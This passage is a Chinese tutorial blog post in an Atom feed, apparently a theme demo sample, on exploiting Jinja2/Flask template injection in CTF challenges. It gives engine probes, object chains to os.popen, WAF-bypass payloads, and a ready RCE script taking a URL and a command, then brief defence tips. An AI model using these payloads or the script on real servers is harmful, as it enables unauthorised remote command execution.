    <title>2026 级第一周周报：SQL 注入与几种 CTF 题型</title>
    <updated>2026-11-16T12:05:50.904Z</updated>
  </entry>
  <entry>
    <author>
      <name>whymm</name>
    </author>
    <category term="Web" scheme="https://whymm.com.cn/categories/Web/"/>
    <category term="SSTI" scheme="https://whymm.com.cn/tags/SSTI/"/>
    <category term="Flask" scheme="https://whymm.com.cn/tags/Flask/"/>
    <category term="Jinja2" scheme="https://whymm.com.cn/tags/Jinja2/"/>
    <category term="WAF" scheme="https://whymm.com.cn/tags/WAF/"/>
    <content>
      <![CDATA[<blockquote><p>这是一篇<strong>示例文章</strong>，用于展示主题的标题、代码块、表格、折叠块等排版效果。发布前请替换成你自己的 Writeup。</p></blockquote><p>服务端模板注入（SSTI）的可怕之处在于：一个看似无害的「个性化欢迎语」，可能直接把 <code>os.popen</code> 递到攻击者手里。这篇笔记把我在多场比赛中反复用到的东西整理成一条流水线：<strong>先确认引擎，再确认回显，最后拿 shell</strong>。</p><h2 id="一、确认模板引擎"><a href="#一、确认模板引擎" class="headerlink" title="一、确认模板引擎"></a>一、确认模板引擎</h2><p>不同引擎的探测 payload 不一样，盲目丢 <code>&#123;&#123;7*7&#125;&#125;</code> 只会浪费请求。先看错误页、响应头、Cookie 名，往往能直接缩小范围。</p><table><thead><tr><th>引擎</th><th>探测 payload</th><th>命中特征</th></tr></thead><tbody><tr><td>Jinja2 (Python)</td><td><code>&#123;&#123;7*7&#125;&#125;</code></td><td>返回 <code>49</code></td></tr><tr><td>Twig (PHP)</td><td><code>&#123;&#123;7*7&#125;&#125;</code></td><td>返回 <code>49</code>，但 <code>&#123;&#123;7*&#39;7&#39;&#125;&#125;</code> 返回 <code>7777777</code> 的是 Twig</td></tr><tr><td>Smarty (PHP)</td><td><code>&#123;$smarty.version&#125;</code></td><td>返回版本号</td></tr><tr><td>Freemarker (Java)</td><td><code>$&#123;7*7&#125;</code></td><td>返回 <code>49</code></td></tr><tr><td>Velocity (Java)</td><td><code>#set($x=7*7)$x</code></td><td>返回 <code>49</code></td></tr><tr><td>EJS (Node)</td><td><code>&lt;%= 7*7 %&gt;</code></td><td>返回 <code>49</code></td></tr></tbody></table><p>Jinja2 与 Twig 的区分技巧：<code>&#123;&#123;7*&#39;7&#39;&#125;&#125;</code> 在 Jinja2 中报错或返回 <code>49</code>，在 Twig 中返回 <code>7777777</code>（字符串重复）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect</span>(<span class="params">url, param</span>):</span><br><span class="line">    probes = &#123;</span><br><span class="line">        <span class="string">&quot;jinja2_twig&quot;</span>: (<span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>),</span><br><span class="line">        <span class="string">&quot;twig_str&quot;</span>: (<span class="string">&quot;&#123;&#123;7*&#x27;7&#x27;&#125;&#125;&quot;</span>, <span class="string">&quot;7777777&quot;</span>),</span><br><span class="line">        <span class="string">&quot;freemarker&quot;</span>: (<span class="string">&quot;$&#123;7*7&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>),</span><br><span class="line">        <span class="string">&quot;smarty&quot;</span>: (<span class="string">&quot;&#123;$smarty.version&#125;&quot;</span>, <span class="string">&quot;Smarty&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> name, (payload, expect) <span class="keyword">in</span> probes.items():</span><br><span class="line">        r = requests.get(url, params=&#123;param: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> expect <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;name&#125;</span> hit with <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> name</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h2 id="二、从表达式到对象链"><a href="#二、从表达式到对象链" class="headerlink" title="二、从表达式到对象链"></a>二、从表达式到对象链</h2><p>确认是 Jinja2 之后，目标是找到一个能访问到 <code>__globals__</code> 的对象。常见入口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 直接读取配置</span></span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 通过字符串类找到 os 模块</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 经典 os 链（需先确认 wae 未禁用 _）</span></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. request 对象（Flask 下常可用）</span></span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>__subclasses__()</code> 索引在不同 Python 版本里会漂移，所以实战里我更偏好<strong>按名字过滤</strong>，而不是硬编码下标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先列出所有含 &quot;Popen&quot; 的类，再定位</span></span><br><span class="line">&#123;&#123;[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;Popen&#x27;</span> <span class="keyword">in</span> x.__name__]&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="三、WAF-绕过"><a href="#三、WAF-绕过" class="headerlink" title="三、WAF 绕过"></a>三、WAF 绕过</h2><details><summary>点击展开：常见关键字被过滤时的绕过思路</summary><p><strong>1. 下划线被过滤</strong> —— 用 request 参数拼接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[&#x27;appli&#x27;+&#x27;cation&#x27;][&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>2. <code>os</code> &#x2F; <code>popen</code> 被过滤</strong> —— 走 <code>__builtins__</code> 的 <code>__import__</code>，或者 <code>subprocess</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[INDEX](&#x27;cat /flag&#x27;, shell=True, stdout=-1).communicate()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 引号被过滤</strong> —— 用 <code>request.args</code> 或 <code>chr()</code> 拼接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(request.args.a)&#125;&#125;&amp;a=__globals__</span><br></pre></td></tr></table></figure><p><strong>4. 长度限制</strong> —— 分块传送，用 <code>&#123;% set %&#125;</code> 不可行时改走 HTTP 参数拼装。</p></details><h2 id="四、一个完整的自动化脚本"><a href="#四、一个完整的自动化脚本" class="headerlink" title="四、一个完整的自动化脚本"></a>四、一个完整的自动化脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    payload = (</span><br><span class="line">        <span class="string">&quot;&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;&quot;</span> + cmd + <span class="string">&quot;&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    )</span><br><span class="line">    r = requests.get(url, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(rce(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p>实际比赛中，这段脚本通常还需要处理 URL 编码、POST 表单和 CSRF token，建议直接挂到 Burp 的 Intruder 里跑。</p><h2 id="五、防守视角"><a href="#五、防守视角" class="headerlink" title="五、防守视角"></a>五、防守视角</h2><ul><li>不要用 <code>render_template_string</code> 渲染用户输入。</li><li>必须渲染时，用 <code>SandboxedEnvironment</code>，并显式限制可用的 filters。</li><li>关闭 debug 模式，生产环境的 traceback 就是最好的 WAF 绕过指南。</li></ul><p><strong>小结</strong>：SSTI 的利用链条很长，但每一环都有固定套路。把探测、对象链、绕过三段拆开练，比赛时就不会卡在第一步。</p>]]>
    </content>
